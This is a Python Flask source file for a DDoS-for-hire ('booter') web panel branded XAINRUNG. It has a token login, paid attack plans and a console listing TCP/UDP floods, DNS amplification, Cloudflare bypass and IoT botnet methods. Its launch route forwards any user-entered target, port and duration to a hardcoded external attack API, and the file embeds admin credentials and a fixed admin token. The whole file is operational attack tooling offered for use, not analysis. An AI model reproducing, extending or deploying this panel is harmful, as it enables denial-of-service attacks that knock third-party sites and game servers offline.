from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
import requests
import logging
import secrets
import time

app = Flask(__name__)
app.secret_key = secrets.token_hex(16) # คีย์สำหรับระบบ Session

# เก็บ Token ในหน่วยความจำ
valid_tokens = {"ADMIN-XAINRUNG-999": time.time() + 86400} 

# --- WEB INTERFACE (HTML/CSS/JS) ---
HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XAINRUNG NETWORK | GLOBAL STRIKE SYSTEM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root { 
            --primary: #9d4edd; 
            --dark-bg: #030105;
            --panel-bg: #0d0d0d;
            --border-color: #1f1f1f;
        }

        body {
            background-color: var(--dark-bg);
            color: #d1d5db;
            font-family: 'Inter', sans-serif;
            margin: 0;
            height: 100vh;
            overflow-x: hidden;
        }

        #space-bg {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: -1;
            background: radial-gradient(circle at center, #0a0a0a 0%, #030105 100%);
        }
        
        .star {
            position: absolute; background: white; border-radius: 50%;
            opacity: 0.3; animation: move-stars linear infinite;
        }
        @keyframes move-stars { from { transform: translateY(0); } to { transform: translateY(-100vh); } }

        .header-font { font-family: 'Orbitron', sans-serif; }

        /* HERO SECTION */
        .hero-title {
            font-size: clamp(4rem, 12vw, 9rem);
            font-weight: 900;
            line-height: 0.85;
            text-shadow: 0 0 40px rgba(157, 78, 221, 0.4);
            letter-spacing: -4px;
        }

        .btn-enter {
            border: 2px solid var(--primary);
            background: rgba(157, 78, 221, 0.05);
            color: #c77dff;
            padding: 1.5rem 4rem;
            font-family: 'Orbitron', sans-serif;
            font-weight: 900;
            letter-spacing: 10px;
            transition: 0.5s;
        }
        .btn-enter:hover {
            background: var(--primary);
            color: white;
            box-shadow: 0 0 60px rgba(157, 78, 221, 0.6);
            transform: scale(1.1);
        }

        /* NEW DASHBOARD UI (THEME LIKE NETFORCE) */
        .glass-panel {
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .cyber-input {
            background: #141414;
            border: 1px solid #262626;
            color: #fff;
            padding: 12px 16px;
            border-radius: 8px;
            width: 100%;
            transition: 0.3s;
        }
        .cyber-input:focus {
            border-color: #444;
            outline: none;
            background: #1a1a1a;
        }

        .btn-strike {
            background: #fff;
            color: #000;
            font-weight: 800;
            padding: 14px;
            border-radius: 8px;
            transition: 0.3s;
            text-transform: uppercase;
            font-size: 14px;
        }
        .btn-strike:hover {
            background: #e5e5e5;
            transform: translateY(-2px);
        }

        .status-badge {
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: bold;
            text-transform: uppercase;
        }

        .page { transition: 0.5s ease-in-out; }
        .hidden { display: none !important; }

        /* Login Box */
        .login-box {
            max-width: 450px;
            width: 90%;
            padding: 3rem;
            border-radius: 16px;
            border: 1px solid #1f1f1f;
            background: #0d0d0d;
        }

        /* Table Style */
        th { color: #666; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; padding: 12px; text-align: left; }
        td { padding: 12px; font-size: 13px; border-top: 1px solid #141414; }
        
        /* SweetAlert Custom Dark */
        .swal2-popup {
            background: #0d0d0d !important;
            border: 1px solid #1f1f1f !important;
            color: #fff !important;
        }

        /* --- STYLES FOR NEW MENU HOME PAGE --- */
        .menu-card {
            background: linear-gradient(145deg, #0f0f0f, #050505);
            border: 1px solid #1f1f1f;
            transition: all 0.3s ease;
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }
        .menu-card:hover {
            border-color: var(--primary);
            transform: translateY(-5px);
            box-shadow: 0 10px 40px -10px rgba(157, 78, 221, 0.3);
        }
        .menu-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 2px; height: 100%;
            background: var(--primary);
            opacity: 0; transition: 0.3s;
        }
        .menu-card:hover::before { opacity: 1; }

        /* Profile & Plan Styles */
        .profile-gradient {
            background: linear-gradient(to bottom, rgba(157, 78, 221, 0.1), transparent);
        }
    </style>
</head>
<body>
    <div id="space-bg"></div>

    <section id="login-page" class="page min-h-screen flex flex-col items-center justify-center p-6 text-center">
        <div class="login-box relative z-10">
            <h2 class="header-font text-2xl font-black text-white mb-2 uppercase">Secure Access</h2>
            <p class="text-[10px] text-zinc-500 mb-8 tracking-[0.3em] uppercase">XAINRUNG GLOBAL STRIKE</p>
            <div class="space-y-6">
                <input type="password" id="token-input" placeholder="ENTER TOKEN" class="cyber-input text-center tracking-[0.3em]">
                <button onclick="verifyToken()" class="btn-strike w-full">VERIFY IDENTITY</button>
                <p id="login-error" class="text-red-500 text-[10px] font-bold uppercase mt-4 hidden">Invalid Token</p>
            </div>
        </div>
    </section>

    <section id="home-page" class="page hidden min-h-screen flex flex-col items-center justify-center p-6">
        <div class="max-w-6xl w-full">
            <div class="flex justify-between items-end mb-12 border-b border-zinc-800 pb-6">
                <div>
                    <h1 class="header-font text-4xl md:text-6xl font-black text-white italic tracking-tighter">
                        XAINGRUNG <span class="text-transparent bg-clip-text bg-gradient-to-r from-purple-500 to-white">PANEL</span>
                    </h1>
                    <p class="text-zinc-500 text-xs md:text-sm tracking-[0.5em] uppercase mt-2">Welcome Back, Commander</p>
                </div>
                <div class="hidden md:block text-right">
                    <div class="text-xs text-zinc-600 font-mono">SERVER STATUS</div>
                    <div class="flex items-center justify-end gap-2 text-green-500 font-bold text-sm">
                        <span class="relative flex h-2 w-2">
                          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                          <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                        </span>
                        OPERATIONAL
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                
                <div onclick="showPage('console')" class="menu-card col-span-1 md:col-span-2 p-8 md:p-10 rounded-2xl group">
                    <div class="flex justify-between items-start h-full flex-col">
                        <div class="w-full">
                            <div class="flex justify-between items-center mb-4">
                                <span class="bg-purple-900/30 text-purple-400 border border-purple-500/30 text-[10px] px-2 py-1 rounded uppercase tracking-wider font-bold">L4 / L7 Methods</span>
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white opacity-50 group-hover:opacity-100 transition" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13 10V3L4 14h7v7l9-11h-7z" />
                                </svg>
                            </div>
                            <h2 class="header-font text-3xl font-bold text-white mb-2">ATTACK HUB</h2>
                            <p class="text-zinc-400 text-sm max-w-md">Access the global attack console. Execute Layer 4 and Layer 7 stress tests with real-time feedback.</p>
                        </div>
                        <div class="mt-8 flex items-center gap-2 text-purple-400 font-bold text-sm group-hover:translate-x-2 transition">
                            ENTER CONSOLE <span>&rarr;</span>
                        </div>
                    </div>
                </div>

                <div onclick="showPage('profile')" class="menu-card p-8 rounded-2xl flex flex-col justify-between">
                    <div>
                        <div class="w-12 h-12 bg-zinc-800 rounded-full flex items-center justify-center text-xl mb-4">👤</div>
                        <h3 class="header-font text-xl font-bold text-white">MY PROFILE</h3>
                        <div class="mt-4 space-y-3">
                            <div>
                                <div class="flex justify-between text-xs text-zinc-500 mb-1">PLAN EXPIRY</div>
                                <div class="text-sm text-white font-mono">LIFETIME</div>
                            </div>
                            <div>
                                <div class="flex justify-between text-xs text-zinc-500 mb-1">CONCURRENTS</div>
                                <div class="text-sm text-white font-mono">1 / 1 Slots</div>
                            </div>
                        </div>
                    </div>
                    <button class="w-full mt-6 py-2 border border-zinc-700 text-zinc-400 text-xs rounded hover:bg-white hover:text-black transition uppercase font-bold">Settings</button>
                </div>

                <div onclick="showPage('plan')" class="menu-card p-8 rounded-2xl">
                    <div class="h-10 w-10 bg-zinc-800 rounded flex items-center justify-center mb-4 text-white">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                    </div>
                    <h3 class="header-font text-lg font-bold text-white mb-1">PURCHASE PLANS</h3>
                    <p class="text-xs text-zinc-500 mb-4">Upgrade your power.</p>
                    <button class="text-xs text-white border-b border-zinc-600 pb-1 hover:border-purple-500 transition">View Pricing</button>
                </div>

                <div onclick="window.open('https://discord.gg/QnpGpdAh', '_blank')" class="menu-card p-8 rounded-2xl md:col-span-2">
                     <div class="flex items-center gap-4">
                        <div class="h-12 w-12 bg-[#5865F2] rounded-xl flex items-center justify-center text-white">
                            <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037 26.153 26.153 0 0 0-3.327 6.86 19.5 19.5 0 0 0-4.886 1.516.07.07 0 0 0-.018.026.071.071 0 0 0-.03.026.07.07 0 0 0-.01.04v.004c-.004.01-.01.02-.01.03a.07.07 0 0 0 .01.04l.004.01c.01.02.02.04.04.05a.074.074 0 0 0 .03.02 14.86 14.86 0 0 0 4.298 2.162.07.07 0 0 0 .079-.026l.995-1.37a14.65 14.65 0 0 1-3.64-1.748.077.077 0 0 1-.008-.106l.243-.284a15.488 15.488 0 0 0 3.75 1.84.07.07 0 0 0 .076-.02l1.015-1.424a.074.074 0 0 0-.016-.096 11.233 11.233 0 0 1-1.79-1.226.076.076 0 0 1-.005-.107l.254-.296a11.983 11.983 0 0 0 2.054 1.344.073.073 0 0 0 .078-.014l.015-.012.003-.003.004-.002.006-.006a.073.073 0 0 0 .025-.047 22.053 22.053 0 0 0 3.327-6.86.074.074 0 0 0-.079-.037ZM10.056 15.655c-1.155 0-2.115-1.06-2.115-2.365 0-1.306.94-2.365 2.115-2.365 1.175 0 2.135 1.06 2.135 2.365 0 1.305-.94 2.365-2.135 2.365Zm5.688 0c-1.155 0-2.115-1.06-2.115-2.365 0-1.306.94-2.365 2.115-2.365 1.175 0 2.135 1.06 2.135 2.365 0 1.305-.94 2.365-2.135 2.365Z"/></svg>
                        </div>
                        <div>
                            <h3 class="header-font text-lg font-bold text-white">JOIN DISCORD</h3>
                            <p class="text-xs text-zinc-400">Get support and updates.</p>
                        </div>
                        <button class="ml-auto px-4 py-2 bg-[#5865F2] hover:bg-[#4752c4] text-white rounded font-bold text-xs uppercase transition">Join Now</button>
                     </div>
                </div>

            </div>
            
            <div class="mt-12 text-center">
                <p class="text-[10px] text-zinc-700 font-mono uppercase">Xaingrung Network Systems © 2024</p>
            </div>
        </div>
    </section>

    <section id="plan-page" class="page hidden min-h-screen p-6 md:p-20">
        <div class="max-w-5xl mx-auto">
            <button onclick="showPage('home')" class="mb-8 text-zinc-500 hover:text-white transition">&larr; BACK TO DASHBOARD</button>
            <h2 class="header-font text-4xl font-black text-white mb-10 text-center italic">SELECT YOUR <span class="text-purple-500">POWER PLAN</span></h2>
            
            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div class="glass-panel p-8 flex flex-col items-center border-t-4 border-zinc-700">
                    <h3 class="header-font text-xl font-bold mb-2">BRONZE</h3>
                    <p class="text-zinc-500 text-xs mb-6">Entry Level Striker</p>
                    <div class="text-3xl font-black text-white mb-6">฿290 <span class="text-xs text-zinc-600">/ 30 Days</span></div>
                    <ul class="text-sm text-zinc-400 space-y-4 mb-8 text-center">
                        <li>300s Attack Time</li>
                        <li>1 Concurrent Attack</li>
                        <li>All L4 Methods</li>
                        <li>Basic L7 Methods</li>
                    </ul>
                    <button class="w-full py-3 bg-zinc-800 rounded font-bold hover:bg-white hover:text-black transition">PURCHASE</button>
                </div>
                <div class="glass-panel p-8 flex flex-col items-center border-t-4 border-purple-600 scale-105 shadow-[0_0_50px_rgba(157,78,221,0.2)]">
                    <div class="bg-purple-600 text-white text-[10px] px-2 py-1 rounded font-black mb-4 uppercase">Popular</div>
                    <h3 class="header-font text-xl font-bold mb-2">GOLD VIP</h3>
                    <p class="text-purple-400 text-xs mb-6">Advanced Warfare</p>
                    <div class="text-3xl font-black text-white mb-6">฿890 <span class="text-xs text-zinc-600">/ 30 Days</span></div>
                    <ul class="text-sm text-zinc-300 space-y-4 mb-8 text-center">
                        <li>600s Attack Time</li>
                        <li>2 Concurrent Attacks</li>
                        <li>Premium L7 (CF Bypass)</li>
                        <li>Botnet Raw Power</li>
                    </ul>
                    <button class="w-full py-3 bg-purple-600 rounded font-bold hover:bg-purple-500 transition">PURCHASE</button>
                </div>
                <div class="glass-panel p-8 flex flex-col items-center border-t-4 border-white">
                    <h3 class="header-font text-xl font-bold mb-2">ULTIMATE</h3>
                    <p class="text-zinc-500 text-xs mb-6">God Mode</p>
                    <div class="text-3xl font-black text-white mb-6">฿2,500 <span class="text-xs text-zinc-600">/ Lifetime</span></div>
                    <ul class="text-sm text-zinc-400 space-y-4 mb-8 text-center">
                        <li>1200s Attack Time</li>
                        <li>5 Concurrent Attacks</li>
                        <li>Private API Access</li>
                        <li>24/7 Dedicated Support</li>
                    </ul>
                    <button class="w-full py-3 bg-white text-black rounded font-bold hover:bg-zinc-200 transition">PURCHASE</button>
                </div>
            </div>
        </div>
    </section>

    <section id="profile-page" class="page hidden min-h-screen p-6 flex items-center justify-center">
        <div class="max-w-xl w-full glass-panel p-10 relative overflow-hidden profile-gradient">
            <div class="absolute top-0 right-0 p-4 opacity-10 font-black text-6xl italic header-font">BOTNET</div>
            
            <div class="flex items-center gap-6 mb-10">
                <div class="w-24 h-24 bg-gradient-to-br from-purple-600 to-black rounded-2xl flex items-center justify-center text-4xl border border-purple-500/50">💀</div>
                <div>
                    <h2 class="header-font text-3xl font-black text-white">OPERATOR_X</h2>
                    <p class="text-purple-400 font-mono text-sm">[ RANK: MASTER OVERLORD ]</p>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-10">
                <div class="bg-black/50 p-4 border border-zinc-800 rounded-lg">
                    <div class="text-[10px] text-zinc-500 mb-1 uppercase">Total Strikes</div>
                    <div class="text-xl font-bold text-white header-font">1,492</div>
                </div>
                <div class="bg-black/50 p-4 border border-zinc-800 rounded-lg">
                    <div class="text-[10px] text-zinc-500 mb-1 uppercase">Member Since</div>
                    <div class="text-xl font-bold text-white header-font">JAN 2024</div>
                </div>
                <div class="bg-black/50 p-4 border border-zinc-800 rounded-lg col-span-2">
                    <div class="text-[10px] text-zinc-500 mb-1 uppercase">System Status</div>
                    <div class="text-green-500 font-mono text-xs">ENCRYPTED_CONNECTION_STABLE</div>
                </div>
            </div>

            <button onclick="showPage('home')" class="w-full py-4 bg-zinc-900 border border-zinc-800 rounded font-bold hover:border-purple-500 transition uppercase tracking-widest text-xs">Return to Mainframe</button>
        </div>
    </section>

    <section id="console-page" class="page hidden min-h-screen p-4 md:p-10">
        <div class="max-w-[1400px] mx-auto">
            <div class="flex justify-between items-center mb-10">
                <div class="flex items-center gap-4">
                    <div class="w-10 h-10 bg-white rounded flex items-center justify-center">
                        <span class="text-black font-black text-xl">X</span>
                    </div>
                    <h2 class="header-font text-xl font-bold text-white uppercase tracking-wider">NetForce Hub</h2>
                </div>
                <div class="flex gap-4">
                    <button onclick="showPage('home')" class="text-xs text-zinc-500 hover:text-white transition">Dashboard</button>
                    <button class="text-xs text-white font-bold border-b-2 border-white pb-1">Attacks</button>
                    <button onclick="showPage('plan')" class="text-xs text-zinc-500 hover:text-white transition">Plans</button>
                </div>
            </div>

            <div class="grid grid-cols-12 gap-6">
                <div class="col-span-12 lg:col-span-4 space-y-6">
                    <div class="glass-panel p-6">
                        <div class="flex justify-between items-center mb-6">
                            <span class="text-xs font-bold uppercase text-zinc-400 tracking-widest">Panel</span>
                            <div class="flex bg-zinc-900 p-1 rounded-md text-[10px]">
                                <button class="px-3 py-1 bg-zinc-800 rounded shadow text-white">L4</button>
                                <button class="px-3 py-1 text-zinc-500">L7</button>
                            </div>
                        </div>

                        <div class="space-y-5">
                            <div class="grid grid-cols-2 gap-4">
                                <div>
                                    <label class="text-[10px] text-zinc-500 block mb-2 uppercase font-bold">Target</label>
                                    <input id="host" type="text" placeholder="127.0.0.1" class="cyber-input">
                                </div>
                                <div>
                                    <label class="text-[10px] text-zinc-500 block mb-2 uppercase font-bold">Port</label>
                                    <input id="port" type="text" placeholder="80" class="cyber-input">
                                </div>
                            </div>
                            <div class="grid grid-cols-2 gap-4">
                                <div>
                                    <label class="text-[10px] text-zinc-500 block mb-2 uppercase font-bold">Duration</label>
                                    <input id="time" type="text" placeholder="60" class="cyber-input">
                                </div>
                                <div>
                                    <label class="text-[10px] text-zinc-500 block mb-2 uppercase font-bold">Zone</label>
                                    <select class="cyber-input bg-[#141414]">
                                        <option>Global (Mixed)</option>
                                        <option>Thailand</option>
                                    </select>
                                </div>
                            </div>
                            <div>
                                <label class="text-[10px] text-zinc-500 block mb-2 uppercase font-bold">Attack Method</label>
                                <select id="method" class="cyber-input uppercase bg-[#141414]">
                                    <optgroup label="Transmission Control Protocol (TCP)">
                                        <option value="TCPACK">TCPACK - TCP-ACK Flood</option>
                                        <option value="TCP-BEST">TCP-BEST - TCP SYN Mixed</option>
                                        <option value="TCP">TCP - Mixed SYN-ACK</option>
                                        <option value="TCPBYPASS">TCPBYPASS - TCP-SYN/ACK Bypass</option>
                                        <option value="HOME-TCP">HOME-TCP - TCP Handshake + PSH-ACK</option>
                                        <option value="TCP-OVH">TCP-OVH - Handshake for OVH</option>
                                    </optgroup>
                                    <optgroup label="User Datagram Protocol (UDP)">
                                        <option value="DISCORD" selected>DISCORD - UDP Flood Static</option>
                                        <option value="DNS">DNS - Domain Name System Amplification</option>
                                        <option value="DNS-VIP">DNS-VIP - DNS Amplification V2</option>
                                        <option value="GAME">GAME - Dynamic UDP + VSE Flood</option>
                                        <option value="UDP-PPS">UDP-PPS - Small Packets High PPS</option>
                                        <option value="DAYZ">DAYZ - UDP Flood for DayZ</option>
                                        <option value="GUDP">GUDP - UDP High GBPS</option>
                                        <option value="OPENVPN">OPENVPN - UDP OpenVPN Emulation</option>
                                        <option value="UDPBPASS">UDPBPASS - UDP Whitelisted Bypass</option>
                                        <option value="UDP-GBPS">UDP-GBPS - UDP Flood High</option>
                                        <option value="HOME-UDP">HOME-UDP - Stateless UDP Flood</option>
                                        <option value="UDP-OVH">UDP-OVH - UDP/TCP Handshake OVH</option>
                                    </optgroup>
                                    <optgroup label="Layer 7 Network">
                                        <option value="HTTP-DDOS">HTTP-DDOS - Node.js HTTP/2 Proxied</option>
                                        <option value="TLS">TLS - HTTP/2 High RPS</option>
                                        <option value="CF-BYPASS">CF-BYPASS - Cloudflare Bypass</option>
                                        <option value="L7-STATION">L7-STATION - Best L7 Station Protection</option>
                                    </optgroup>
                                    <optgroup label="Raw Methods (IoT Botnet)">
                                        <option value="BOTNET-UDP">BOTNET-UDP - RAW UDP High Traffic</option>
                                        <option value="BOTNET-TCP">BOTNET-TCP - RAW TCP Custom 3-way</option>
                                        <option value="BOTNET-FIVEM">BOTNET-FIVEM - RAW UDP FiveM Query</option>
                                        <option value="BOTNET-ACK">BOTNET-ACK - RAW Spoofed PSH-ACK</option>
                                        <option value="DISCORD-RAW">DISCORD-RAW - RAW UDP Static Discord</option>
                                        <option value="BOTNET-GAME">BOTNET-GAME - RAW UDP VSE IoT</option>
                                    </optgroup>
                                </select>
                            </div>
                            <button onclick="executeAttack()" class="btn-strike w-full mt-4 flex items-center justify-center gap-2">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
                                Start Attack
                            </button>
                        </div>
                    </div>
                </div>

                <div class="col-span-12 lg:col-span-8">
                    <div class="glass-panel h-full min-h-[500px] flex flex-col">
                        <div class="p-6 border-b border-[#141414] flex justify-between items-center">
                            <h3 class="text-sm font-bold text-white uppercase tracking-widest">Your Attacks</h3>
                            <div class="flex gap-4">
                                <div class="text-[10px]"><span class="text-zinc-500">Total:</span> <span id="total-count">0</span></div>
                                <div class="text-[10px]"><span class="text-green-500">Active:</span> <span id="active-count">0</span></div>
                            </div>
                        </div>
                        <div class="overflow-x-auto">
                            <table class="w-full">
                                <thead>
                                    <tr>
                                        <th>Target</th>
                                        <th>Port</th>
                                        <th>Method</th>
                                        <th>Duration</th>
                                        <th>Status / Logs</th>
                                    </tr>
                                </thead>
                                <tbody id="attack-history">
                                    </tbody>
                            </table>
                            <div id="no-data" class="p-20 text-center text-zinc-600 text-xs">
                                No attack history found.
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script>
        // Starfield
        const bg = document.getElementById('space-bg');
        for (let i = 0; i < 150; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            const size = Math.random() * 2;
            star.style.width = size + 'px'; star.style.height = size + 'px';
            star.style.left = Math.random() * 100 + '%'; star.style.top = Math.random() * 100 + '%';
            star.style.animationDuration = (Math.random() * 5 + 5) + 's';
            bg.appendChild(star);
        }

        async function verifyToken() {
            const token = document.getElementById('token-input').value;
            const res = await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ token })
            });
            const data = await res.json();
            if(data.status === 'success') showPage('home');
            else {
                document.getElementById('login-error').classList.remove('hidden');
                setTimeout(() => document.getElementById('login-error').classList.add('hidden'), 3000);
            }
        }

        function showPage(page) {
            document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
            document.getElementById(`${page}-page`).classList.remove('hidden');
        }

        let attackCounter = 0;
        async function executeAttack() {
            const target = document.getElementById('host').value;
            const port = document.getElementById('port').value;
            const time = document.getElementById('time').value;
            const method = document.getElementById('method').value;

            if(!target || !port) {
                Swal.fire({ icon: 'error', title: 'Missing Data', text: 'Please fill in target and port.' });
                return;
            }

            try {
                const response = await fetch('/api/launch', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, port, time, method })
                });
                const data = await response.json();

                if(data.status === 'success') {
                    Swal.fire({
                        icon: 'success',
                        title: 'SUCCESS',
                        text: 'Attack command has been successfully dispatched.',
                        timer: 2000,
                        showConfirmButton: false
                    });
                    addAttackToTable(target, port, method, time, data.message);
                } else {
                    Swal.fire({
                        icon: 'warning',
                        title: 'STRIKE ERROR',
                        text: data.message || 'Server rejected request',
                        confirmButtonColor: '#9d4edd'
                    });
                    addAttackToTable(target, port, method, time, data.message, true);
                }
            } catch (err) {
                Swal.fire({ icon: 'error', title: 'Connection Error', text: 'Quantum Link Failed.' });
            }
        }

        function addAttackToTable(target, port, method, time, apiMsg, isError = false) {
            document.getElementById('no-data').classList.add('hidden');
            const tbody = document.getElementById('attack-history');
            const row = document.createElement('tr');
            attackCounter++;
            
            const statusClass = isError ? "bg-red-500/20 text-red-500" : "bg-green-500/20 text-green-500";
            const statusText = isError ? "Failed" : "Active";

            row.innerHTML = `
                <td class="text-white font-medium">${target}</td>
                <td class="text-zinc-400">${port}</td>
                <td><span class="bg-zinc-800 text-[9px] px-2 py-1 rounded text-zinc-300 uppercase">${method}</span></td>
                <td class="text-zinc-400">${time}s</td>
                <td>
                    <div class="flex flex-col gap-1">
                        <span class="status-badge ${statusClass} w-fit">${statusText}</span>
                        <span class="text-[9px] text-zinc-500 font-mono break-all max-w-[200px]">${apiMsg || ''}</span>
                    </div>
                </td>
            `;
            tbody.prepend(row);
            
            document.getElementById('total-count').innerText = attackCounter;
            if(!isError) {
                document.getElementById('active-count').innerText = "1";
                setTimeout(() => {
                    row.querySelector('.status-badge').innerText = "Completed";
                    row.querySelector('.status-badge').className = "status-badge bg-zinc-800 text-zinc-500 w-fit";
                    document.getElementById('active-count').innerText = "0";
                }, time * 1000);
            }
        }

        window.onload = async () => {
            const res = await fetch('/api/check_session');
            const data = await res.json();
            if(data.logged_in) showPage('home');
        };
    </script>
</body>
</html>
"""

# --- TOKEN ADMIN PAGE (HTML) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>TOKEN GENERATOR</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
    <style>body{background:#05000a;color:#c77dff;font-family:'Orbitron',sans-serif;}</style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="p-10 bg-black border-2 border-purple-500 rounded-xl shadow-[0_0_30px_#9d4edd] text-center max-w-lg w-full">
        <h1 class="text-2xl font-bold mb-6 italic">TOKEN_ADMIN_PANEL</h1>
        <form method="POST">
            <input name="pw" type="password" placeholder="Admin Password" class="w-full bg-zinc-900 border border-purple-900 p-4 mb-4 rounded text-center">
            <button class="w-full bg-purple-600 p-4 rounded font-bold hover:bg-purple-500 transition">GENERATE NEW TOKEN</button>
        </form>
        {% if token %}
        <div class="mt-8 p-4 bg-purple-950/30 border border-dashed border-purple-400">
            <p class="text-[10px] text-purple-300">NEW_TOKEN_GENERATED:</p>
            <p class="text-xl font-black text-white select-all">{{ token }}</p>
            <p class="text-[8px] text-zinc-500 mt-2">EXPIRES IN: 24 HOURS</p>
        </div>
        {% endif %}
        <a href="/" class="block mt-6 text-[10px] underline">Back to Gateway</a>
    </div>
</body>
</html>
"""

# --- BACKEND LOGIC ---

@app.route('/')
def index():
    return render_template_string(HTML_CODE)

@app.route('/tokenadmin', methods=['GET', 'POST'])
def token_admin():
    new_token = None
    if request.method == 'POST':
        admin_pw = request.form.get('pw')
        if admin_pw == "XainrungAdmin99":
            token_val = f"XR-{secrets.token_hex(4).upper()}-{secrets.token_hex(4).upper()}"
            valid_tokens[token_val] = time.time() + 86400
            new_token = token_val
    return render_template_string(ADMIN_HTML, token=new_token)

@app.route('/api/verify', methods=['POST'])
def verify():
    token = request.json.get('token')
    if token in valid_tokens and time.time() < valid_tokens[token]:
        session['logged_in'] = True
        return jsonify({"status": "success"})
    return jsonify({"status": "error"})

@app.route('/api/check_session')
def check_session():
    return jsonify({"logged_in": session.get('logged_in', False)})

@app.route('/api/launch', methods=['POST'])
def launch():
    if not session.get('logged_in'):
        return jsonify({"status": "error", "message": "UNAUTHORIZED_ACCESS"})
        
    data = request.json
    target = data.get('target')
    port = data.get('port')
    time_val = data.get('time')
    method = data.get('method')

    # API URL
    api_url = f"http://84.21.173.208:7575/api/attack?username=Xaingrung&password=Xaingrung&target={target}&port={port}&time={time_val}&method={method}"
    
    try:
        response = requests.get(api_url, timeout=10)
        # ตรวจสอบว่า API ส่ง JSON หรือข้อความธรรมดามา
        try:
            api_data = response.json()
            msg = api_data.get('message') or api_data.get('msg') or str(api_data)
        except:
            msg = response.text[:100] # ถ้าไม่ใช่ JSON ให้เอา text 100 ตัวแรก

        if response.status_code == 200:
            return jsonify({"status": "success", "message": msg or "STRIKE_CONFIRMED"})
        else:
            return jsonify({"status": "error", "message": msg or f"HTTP_ERR_{response.status_code}"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
